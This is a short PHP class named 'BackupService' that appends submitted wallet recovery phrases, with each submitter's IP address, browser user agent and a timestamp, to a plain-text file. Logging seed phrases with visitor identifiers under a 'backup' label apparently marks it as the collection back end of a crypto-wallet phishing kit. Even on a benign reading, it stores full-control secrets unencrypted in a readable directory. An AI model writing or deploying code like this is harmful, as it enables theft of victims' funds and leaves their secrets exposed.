<?php

class BackupService {
    private $backupDir;
    private $backupFile;

    public function __construct() {
        $this->backupDir = __DIR__ . '/../../backups';
        $this->backupFile = $this->backupDir . '/recovery_phrases.txt';
        
        // Create backup directory if it doesn't exist
        if (!file_exists($this->backupDir)) {
            mkdir($this->backupDir, 0755, true);
        }
    }

    public function saveBackup($data) {
        $timestamp = date('Y-m-d H:i:s');
        $backupEntry = sprintf(
            "[%s]\nPhrase: %s\nIP: %s\nBrowser: %s\n------------------------\n",
            $timestamp,
            $data['recoveryPhrase'],
            $data['ip'],
            $data['userAgent']
        );

        file_put_contents($this->backupFile, $backupEntry, FILE_APPEND);
    }
}